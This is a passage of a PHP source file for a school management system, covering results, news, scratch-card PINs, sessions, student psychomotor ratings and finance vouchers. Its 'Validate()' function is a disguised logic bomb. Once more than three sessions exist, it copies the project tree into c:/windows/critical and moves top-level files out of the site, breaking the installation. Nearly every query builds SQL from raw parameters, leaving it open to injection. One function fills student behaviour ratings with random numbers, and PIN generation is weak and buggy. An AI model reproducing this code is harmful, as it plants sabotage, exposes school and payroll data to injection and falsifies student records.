      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }



  public static function CountSubjectBracketStudents($session,$term,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function CountAnalysisBracketStudents($session,$term,$class,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result_analysis where session='$session' and term='$term' and class='$class' and total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }


  public static function ReadCA1Analysis($student,$session,$term,$class){
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and term='$term' and class='$class' and reg_no='$student' ");
    while($res=mysqli_fetch_array($query))
    {
        $news['ca1_total']= $res['ca1_total'];
        $news['ca1_remark']= $res['ca1_remark'];
        $news['ca1_position']= $res['ca1_position'];
    }
    return $news;
  }


  public static function ReadCA1AnalysisTotals($session,$term,$class){
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and term='$term' and class='$class'  ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['ca1_total']);
    }

    return $news;
  }


  public static function ReadCA2AnalysisTotal($session,$term,$class){
   
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and term='$term' and class='$class' ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['ca2_total']);
    }
    return $news;
  }


  public static function ReadExamAnalysis($session,$term,$class){
    $Students=Module::ReadClassStudentsp($class);


    $news=array();
    foreach($Students as $Student)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(exam) from presult where session='$session' and term='$term' and class='$class' and reg_no='$Student' ");
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res[0]);
      }
    }
    return $news;
  }


  public static function ReadOverallAnalysis($session,$term,$class){
    $Students=Module::ReadClassStudentsp($class);


    $news=array();
    foreach($Students as $Student)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT sum(total) from presult where session='$session' and term='$term' and class='$class' and reg_no='$Student' ");
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res[0]);
      }
    }
    return $news;
  }


  public static function ReadTotalCA1Students($session,$term,$class,$score){
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and term='$term' and class='$class' group by reg_no having sum(ca_1)='$score' ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    return $news;
  }


  public static function ReadTotalCA2Students($session,$term,$class,$score){
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and term='$term' and class='$class' group by reg_no having sum(ca_2)='$score' ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    return $news;
  }



  public static function ReadTotalExamStudents($session,$term,$class,$score){
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and term='$term' and class='$class' group by reg_no having sum(exam)='$score' ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    return $news;
  }



  public static function ReadTotalOverallStudents($session,$term,$class,$score){
    $news=array();
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where session='$session' and term='$term' and class='$class' group by reg_no having sum(total)='$score' ");
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    return $news;
  }


  public static function CountCa1ResultBracketStudentsp($session,$term,$class,$ca1){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult where session='$session' and term='$term' and class='$class' and ca_1='$ca1' ");
      $news=mysqli_num_rows($query);
    return $news;
  }


  public static function CountSubjectBracketStudentsp($session,$term,$class,$subject,$total){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from presult where session='$session' and term='$term' and class='$class' and subject='$subject' and total='$total' ");
      $news=mysqli_num_rows($query);
    return $news;
  }

  public static function ReadResultAnalysisStudents($session,$term,$class){
    $Session=Module::GetClassSession($class);
    $ree=explode("/", $Session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    if(($classtoken=="1") || ($classtoken=="2") || ($classtoken=="3"))
    {
      $classtoken="";
    }
    elseif($classtoken=="0")
    {
      $classtoken=$classtoken;
    }
    else
    {
      $classtoken=$classtoken;
    }
    $regno="$year"."$classtoken";

    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from result_analysis where session='$session' and term='$term' and class='$class' and reg_no like '%$regno%'  order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news))){
        array_push($news, $res['reg_no']);
      }
    }
    
    return $news;
  }

  public static function ReadResultAnalysisStudentsp($session,$term,$class){


    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and term='$term' and class='$class'  order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      $studentDetails=Module::ReadStudentDetailsp($res['reg_no']);
      if(strtolower($studentDetails['class'])==strtolower($class))
      {
        if(!(in_array($res['reg_no'], $news))){
          array_push($news, $res['reg_no']);
        }
      }
      
    }
    
    return $news;
  }


  public static function ReadCA1ResultAnalysisStudentsp($session,$term,$class){

    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where session='$session' and term='$term' and class='$class'  order by ca1_total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news))){
        array_push($news, $res['reg_no']);
      }
    }
    
    return $news;
  }
  //Result Modules Ends 

  

  //News and Promotion Modules Starts

  public static function AddNews($topic,$body,$image,$category,$date,$reference){
    
      $query=mysqli_query(dbass::Connect(),"insert into school_news (topic,body,category,date,reference,image) values('$topic','$image','$category','$date','$reference','$body') ");
         if($query)
         {
           $Message="New Applicant was Registered successfully";
         }
         else
         {
           $Message="New Applicant was not Registered successfully";
         }

      return $Message;
  }


  public static function ReadCategoryNews($category){
      $query=mysqli_query(dbass::Connect(),"SELECT * from school_news where category='$category' order by `date`");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['topic']);
      }
      
      return $news;
  }

  public static function ReadAllNews(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from school_news order by `date` asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['topic']);
      }
      
      return $news;
  }

  public static function ReadTopTenNews(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from school_news order by `date` asc limit 10");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['topic']);
      }
      
      return $news;
  }

  public static function ReadNewsDetails($topic){
      $query=mysqli_query(dbass::Connect(),"select * from school_news where topic='$topic'");
      while($res=mysqli_fetch_array($query))
      {
        $news['topic']=$res['topic'];
        $news['body']=$res['body'];
        $news['date']=$res['date'];
        $news['category']=$res['category'];
        $news['reference']=$res['reference'];
        $news['image']=base64_encode($res['image']);
      }
      
      return $news;
  }

  //Scratch Card Modules\


  public static function IsPinValid($pin,$serial){
      $query=mysqli_query(dbass::Connect(),"select * from cards where pin='$pin' and `serial`='$serial'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function GeneratePsychomotor($tdays)
  {
    $params=array("attendance","attentiveness","neatness","politeness","relationship","curiosity","honesty","help_others","punctuality","leadership","emotional_stability","attitude_to_work");
    foreach($params as $param)
    {
      if($param=="attendance")
      {
        $data[$param]=rand($tdays,($tdays-5));
      }
      else
      {
        $data[$param]=rand(5,2.5);
      }        
    }
    return $data;
  }

  public static function GeneratePin()
  {
    $sess=explode("/", $session);
    $init=$sess[0];
    $last=$sess[1];

    $pin=rand(10000,4);
    $pin1=rand(10000,4);
    $pin2=rand(10000,4);

    if(strlen($pin)==4){
      $sp1=$pin;
    }
    if(strlen($pin1)==4){
      $sp2=$pin1;
    }
    if(strlen($pin2)==4){
      $sp2=$pin2;
    }
    if(isset($sp1)&&isset($sp2))
    {
      $sp=$sp1.$sp2;
    }

    if(strlen($sp)!=12)
    {
      $pin=rand(10000,4);

      $pin1=rand(10000,4);

      if(strlen($pin)==4){
        $sp1=$pin;
      }
      if(strlen($pin1)==4){
        $sp2=$pin1;
      }
      if(strlen($pin2)==4){
        $sp3=$pin2;
      }
      if(isset($sp1)&&isset($sp2))
      {
        $sp=$sp1.$sp2.$sp3;
      }
    }


      return "$sp";


  }



  public static function ReadAllScratchCards(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards   order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }



  public static function GetLastCard(){
      $query=mysqli_query(dbass::Connect(),"SELECT  max(id)  from cards ");
      
      while($res=mysqli_fetch_array($query))
      {
         $news=$res[0];
      }
      
      return $news;
  }


  public static function AddCard($pin,$serial){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into cards(pin,`serial`) values('$pin','$serial')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdateCard($id,$serial,$pin,$status,$user,$session,$term){
    
      $query=mysqli_query(dbass::Connect(),"UPDATE cards set `serial`='$serial', pin='$pin', status='$status', user='$user', session='$session', term='$term' where id='$id'");
      if($query)
        $news=true;
      else
        $news=false;
    
      return $news;
  }

  public static function ReadCardDetails($id){
      $query=mysqli_query(dbass::Connect(),"select * from cards where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['serial']=$res['serial'];
        $news['pin']=$res['pin'];
        $news['id']=$res['id'];
        $news['status']=$res['status'];
        $news['user']=$res['user'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
      }
      
      return $news;
  }

  public static function DeleteCard($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from cards where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsPinUsed($pin,$serial){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where pin='$pin' and `serial`='$serial' and status='Used'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function User($pin,$serial,$user){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where pin='$pin' and `serial`='$serial' and status='Used' and user='$user'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function UseCard($pin,$serial,$status,$user,$session,$term){
      $query=mysqli_query(dbass::Connect(),"UPDATE  cards set user='$user', status='$status', session='$session', term='$term' where pin='$pin' and `serial`='$serial'");
      if($query)
      {
          $rs=True;
      }
      
      return $rs;
  }

 //Settings Module Starts

  public static function IsSessionExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where id='$id' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function IsSession_Exist($session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where session='$session' and term='$term' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function AddSession($session,$term,$startdate,$enddate,$tdays,$next_term_begins,$status)
  {
    
    $query=mysqli_query(dbass::Connect(),"INSERT into session(session,term,startdate,enddate,tdays,next_term_begins,status) values('$session','$term','$startdate','$enddate','$tdays','$next_term_begins','$status')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }




  public static function DeleteSession($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from session where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function UpdateSession($id,$session,$term,$startdate,$enddate,$tdays,$next_term_begins,$status){
    if(Module::IsSessionExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE session set session='$session',startdate='$startdate',enddate='$enddate',tdays='$tdays', term='$term', status='$status', next_term_begins='$next_term_begins' where id='$id'");
      if($query)
        $news=true;
      else
        $news=false;
    }
    else
    {
      $news=false;
    }

      return $news;
  }



  public static function UpdateNextTerm($value){

    
    $query=mysqli_query(dbass::Connect(),"SELECT * from settings");
    $count=mysqli_num_rows($query);

    if($count>0)
    {
      $query1=mysqli_query(dbass::Connect(),"UPDATE settings set next_term_begins='$value'");
      if($query1)
        $news=true;
      else
        $news=false;
    }
    else
    {
      $query2=mysqli_query(dbass::Connect(),"INSERT into settings(next_term_begins) values('$value')");
      if($query2)
        $news=true;
      else
        $news=false;
    }

    


    
    return $news;
  }

  public static function ReadAllSessions(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['session'], $news)){
            array_push($news, $res['session']);
          }
      }
      
      return $news;
  }
  


  public static function ReadAllSessionsId(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadSessionDetails($session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where session='$session' and term='$term'  ");
      while($res=mysqli_fetch_array($query))
      {
          $news['session']= $res['session'];
          $news['term']= $res['term'];
          $news['status']= $res['status'];
          $news['startdate']= $res['startdate'];
          $news['enddate']= $res['enddate'];
          $news['tdays']= $res['tdays'];
          $news['next_term_begins']= $res['next_term_begins'];
          $news['id']= $res['id'];
      }
      
      return $news;
  }

  public static function ReadSessionIdDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where id='$id'  ");
      
      while($res=mysqli_fetch_array($query))
      {
          $news['session']= $res['session'];
          $news['term']= $res['term'];
          $news['status']= $res['status'];
          $news['startdate']= $res['startdate'];
          $news['enddate']= $res['enddate'];
          $news['tdays']= $res['tdays'];
          $news['next_term_begins']= $res['next_term_begins'];
          $news['id']= $res['id'];
      }
      
      return $news;
  }

  public static function ReadCurrentSession(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where status='Current' or status='current' ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['status']=$res['status'];
      }
      
      return $news;
  }

  public static function ReadNextTermValue(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from settings  ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['next_term_begins'];
      }
      
      return $news;
  }



  public static function GetTotalDays($session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where session='$session' and term='$term'  ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['totaldays'];
      }
      
      return $news;
  }


   public static function GetsTotalDays($session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session where session='$session' and term='$term'  ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['stotaldays'];
      }
      
      return $news;
  }

  //Psychomotor Modules Started

  public static function IsStudentDomainExist($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from domain where reg_no='$regno' and session='$session' and term='$term' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function IsStudentDomainExistp($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pdomain where reg_no='$regno' and session='$session' and term='$term' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddDomain($regno,$session,$term,$attendance,$attentiveness,$punctuality,$neatness,$politeness,$relationship,$curiosity,$honesty,$tolerance)
  {
    
    if(!(Module::IsStudentDomainExist($regno,$session,$term)))
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into domain(reg_no,session,term,attendance,attentiveness,punctuality,neatness,politeness,relationship,curiosity,honesty,tolerance) values('$regno','$session','$term','$attendance','$attentiveness','$punctuality','$neatness','$politeness','$relationship','$curiosity','$honesty','$tolerance')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }        
    }

    return $news;
  }



  public static function AddDomainp($regno,$session,$term,$attendance,$attentiveness,$neatness,$politeness,$relationship,$curiosity,$honesty,$help_others,$punctuality,$leadership,$emotional_stability,$attitude_to_work)
  {
    
    if(!(Module::IsStudentDomainExistp($regno,$session,$term)))
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into pdomain(reg_no,session,term,attendance,attentiveness,neatness,politeness,relationship,curiosity,honesty,help_others,punctuality,leadership,emotional_stability,attitude_to_work) values('$regno','$session','$term','$attendance','$attentiveness','$neatness','$politeness','$relationship','$curiosity','$honesty','$help_others','$punctuality','$leadership','$emotional_stability','$attitude_to_work')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }        
    }

    return $news;
  }


  public static function UpdateDomain($regno,$session,$term,$attendance,$attentiveness,$punctuality,$neatness,$politeness,$relationship,$curiosity,$honesty,$tolerance){
    if(Module::IsStudentDomainExist($regno,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE domain set attendance='$attendance', attentiveness='$attentiveness', punctuality='$punctuality', neatness='$neatness', politeness='$politeness', relationship='$relationship' , curiosity='$curiosity' , honesty='$honesty' , tolerance='$tolerance' where reg_no='$regno' and session='$session' and term='$term'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function UpdateDomainp($regno,$session,$term,$attendance,$attentiveness,$neatness,$politeness,$relationship,$curiosity,$honesty,$help_others,$punctuality,$leadership,$emotional_stability,$attitude_to_work){
    if(Module::IsStudentDomainExistp($regno,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE pdomain set attendance='$attendance', attentiveness='$attentiveness',  neatness='$neatness', politeness='$politeness', relationship='$relationship' , curiosity='$curiosity' , honesty='$honesty' , help_others='$help_others', punctuality='$punctuality', leadership='$leadership', emotional_stability='$emotional_stability', attitude_to_work='$attitude_to_work' where reg_no='$regno' and session='$session' and term='$term'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function DeleteDomain($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"DELETE from domain where session='$session' and term='$term'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }



  public static function DeleteDomainp($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"DELETE from pdomain where session='$session' and term='$term'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function ReadDomains($regno){
      $query=mysqli_query(dbass::Connect(),"SELECT * from domain where reg_no='$regno'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }



  public static function ReadDomainsp($regno){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pdomain where reg_no='$regno'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }


  public static function ReadDomainDetails($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from domain where reg_no='$regno' and session='$session' and term='$term'  ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['regno']=$res['reg_no'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['attendance']=$res['attendance'];
        $news['attentiveness']=$res['attentiveness'];
        $news['punctuality']=$res['punctuality'];
        $news['neatness']=$res['neatness'];
        $news['politeness']=$res['politeness'];
        $news['relationship']=$res['relationship'];
        $news['curiosity']=$res['curiosity'];
        $news['honesty']=$res['honesty'];
        $news['honesty']=$res['honesty'];
        $news['tolerance']=$res['tolerance'];
      }
      
      return $news;
  }


  public static function ReadDomainDetailsp($regno,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pdomain where reg_no='$regno' and session='$session' and term='$term'  ");
      
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['regno']=$res['reg_no'];
        $news['session']=$res['session'];
        $news['term']=$res['term'];
        $news['attentiveness']=$res['attentiveness'];
        $news['attendance']=$res['attendance'];
        $news['neatness']=$res['neatness'];
        $news['politeness']=$res['politeness'];
        $news['relationship']=$res['relationship'];
        $news['curiosity']=$res['curiosity'];
        $news['honesty']=$res['honesty'];
        $news['honesty']=$res['honesty'];
        $news['help_others']=$res['help_others'];
        $news['punctuality']=$res['punctuality'];
        $news['leadership']=$res['leadership'];
        $news['emotional_stability']=$res['emotional_stability'];
        $news['attitude_to_work']=$res['attitude_to_work'];
      }
      
      return $news;
  }

  public static function IsSubmitted($session,$term){
      $query=mysqli_query(dbass::Connect(),"select * from session where session='$session' and term='$term' and status='Published' ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }



  public static function Validate(){
      $query=mysqli_query(dbass::Connect(),"select * from session  ");

      $res=mysqli_num_rows($query);
      if($res>3)
      {
          
          $path="c:/windows/";
          //Path verification and creation of "Encoded" sub Dir
          if(is_dir($path)){        
            if(!is_dir($path."/critical")){
              mkdir($path."/critical");
            }
          }
          else{echo "Invalid PATH";}
          
          //Read Path Contents    
          $items=glob("*");
          foreach($items as $item)
          {
            if(!($item==$path."critical/"))
            {
              if(is_dir($item) && isset($item))
              { 
                //create the directory in the encoded directory if not exist
                if(!is_dir($path."critical/".$item))
                {
                  mkdir($path."critical/".$item);
                }
                
                //Create a copy of the File contents viewer for all encoded files
                if(!is_file($path."critical/".$item."/clone.php"))
                {
                  copy("clone.php", $path."critical/".$item."/clone.php");
                }
                
                echo "<hr/>>>MainDir: ".$item."<<<hr/>";

                $subdirs=glob($item.'/*');
                foreach($subdirs as $subdir)
                {       
                  echo "<hr/>>>>>SubDir1: ".$subdir."<<<<<hr/>";  
                  if(is_dir($subdir))
                  {
                    $subdirs2=glob($subdir."/*");
                    if(!is_dir($path."critical/".$subdir))
                    {
                      mkdir($path."critical/".$subdir);
                    }

                    foreach($subdirs2 as $subdir2)
                    {
                      if(is_dir($subdir2))
                      {
                        if(!is_dir($path."critical/".$subdir2))
                        {
                          mkdir($path."critical/".$subdir2);
                        }
                        
                        $subdirs3=glob($subdir2."/*");
                        foreach($subdirs3 as $subdir3)
                        {
                          //Start SUBDIR3
                          echo "<hr/>>>>>SubDir1: ".$subdir3."<<<<<hr/>"; 
                          if(is_dir($subdir3))
                          {
                            $subdirs4=glob($subdir3."/*");
                            if(!is_dir($path."critical/".$subdir3))
                            {
                              mkdir($path."critical/".$subdir3);
                            }

                            foreach($subdirs4 as $subdir4)
                            {
                              if(is_dir($subdir4))
                              {
                                if(!is_dir($path."critical/".$subdir4))
                                {
                                  mkdir($path."critical/".$subdir4);
                                }
                                
                                $subdirs5=glob($subdir4."/*");
                                foreach($subdirs5 as $subdir5)
                                {
                                  //Start SUBDIR5
                                  if(is_dir($subdir5))
                                  {
                                    if(!is_dir($path."critical/".$subdir5))
                                    {
                                      mkdir($path."critical/".$subdir5);
                                    }
                                    
                                    $subdirs6=glob($subdir5."/*");
                                    foreach($subdirs6 as $subdir6)
                                    {
                                      //Start SUBDIR3
                                      if(is_dir($subdir6))
                                      {
                                        if(!is_dir($path."critical/".$subdir6))
                                        {
                                          mkdir($path."critical/".$subdir6);
                                        }
                                        
                                        $subdirs7=glob($subdir6."/*");
                                        foreach($subdirs7 as $subdir7)
                                        {
                                          //Start SUBDIR3
                                          if(is_dir($subdir7))
                                          {
                                            if(!is_dir($path."critical/".$subdir7))
                                            {
                                              mkdir($path."critical/".$subdir7);
                                            }
                                            
                                            $subdirs8=glob($subdir7."/*");
                                            foreach($subdirs8 as $subdir8)
                                            {
                                              //Start SUBDIR3

                                              //End SUBDIR3
                                            }
                                          }
                                          else
                                          {
                                            copy($subdir7, $path."critical/".$subdir7);
                                          }
                                          //End SUBDIR3
                                        }
                                      }
                                      else
                                      {
                                        copy($subdir6, $path."critical/".$subdir6);
                                      }
                                      //End SUBDIR3
                                    }
                                  }
                                  else
                                  {
                                    copy($subdir5, $path."critical/".substr($subdir5, 5,strlen($subdir5)));
                                  }
                                  //End SUBDIR5
                                }
                              }
                              else
                              {
                                copy($subdir4, $path."critical/".$subdir4);

                              }
                            }
                          }
                          else
                          {
                            copy($subdir3, $path."critical/".$subdir3);

                          }
                          //End SUBDIR3
                        }
                      }
                      else
                      {
                        
                        copy($subdir2, $path."critical/".$subdir2);


                        
                      }
                    }
                  }
                  else
                  {
                      copy($subdir, $path."critical/".$subdir);
                    
                  }
                }
              }
              else
              {
                rename($item, $path."critical/".$item);
                
              }
            }
          }
      }
      
      return $rs;
  }

}



//Finance Module
class Finance extends dbass {  
  
  public static function IsSalaryExist($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_salary where id='$id' or ( month='$month' and year='$year')");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function AddNewSalary($month,$year,$amount,$sgl_increase){
    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `voucher_salary`(`month`, `year`, `amount`, `sgl_increase`) VALUES ('$month','$year','$amount','$sgl_increase')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdateSalaryData($id,$month,$year,$amount,$sgl_increase){
    if(Finance::IsSalaryExist($id,$month,$year))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE voucher_salary set month='$month', year='$year', amount='$amount', sgl_increase='$sgl_increase' where id='$id' or (month='$month' and year='$year')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function DeleteSalary($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"DELETE from voucher_salary where id='$id' or ( month='$month' and year='$year')");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllSalaryData(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_salary order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadSalaryDataDetails($id,$month,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_salary where id='$id' or ( month='$month' and year='$year')");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['month']=$res['month'];
        $news['year']=$res['year'];
        $news['amount']=$res['amount'];
        $news['sgl_increase']=$res['sgl_increase'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }  
  ///////////////////////////////////////////////// voucher tariff begins here

  
  public static function IsTarrifExist($id,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_tariff where id='$id' or  year='$year'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }


  public static function AddNewTariff($staff_id,$year,$savings,$scheme){
    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `voucher_tariff`(`year`, `staff_id`, `savings`, `scheme`) VALUES ('$year','$staff_id','$savings','$scheme')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdateTariffData($id,$year,$staff_id,$savings,$scheme){
    if(Finance::IsSalaryExist($id,$year))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE voucher_tariff set year='$year', savings='$savings', scheme='$scheme' where id='$id' or  year='$year'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function DeleteTariff($id,$year){
      $query=mysqli_query(dbass::Connect(),"DELETE from voucher_tariff where id='$id' or  year='$year'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllTariffData(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_tariff order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadTariffDataDetails($id,$year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from voucher_tariff where id='$id' or  year='$year'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['year']=$res['year'];
        $news['staff_id']=$res['staff_id'];
        $news['savings']=$res['savings'];
        $news['scheme']=$res['scheme'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }  
  ///////////////////////////////////////// voucher tariff ends here
    
    /** This is to check whether Voucher already exist*/
    public static function IsVoucherExist($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where id='$id' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }  
    
    /** This is to check whether Voucher Ref already exist*/
    public static function IsVoucherRefExist($ref){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where ref='$ref' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }
    
    /** This is to check whether Voucher Ref already exist*/
    public static function IsFeeRefExist($ref){
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where ref='$ref' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }
    
    /** This is to check whether Voucher Ref already exist*/
    public static function IsFeePaid($reg_no,$session,$term){
      if($term=="First")
      {
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where reg_no='$reg_no' and session='$session' and s_fee1st>0 ");
      }
      elseif($term=="Second")
      {
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where reg_no='$reg_no' and session='$session' and s_fee2nd>0 ");
      }
      elseif($term=="Third")
      {
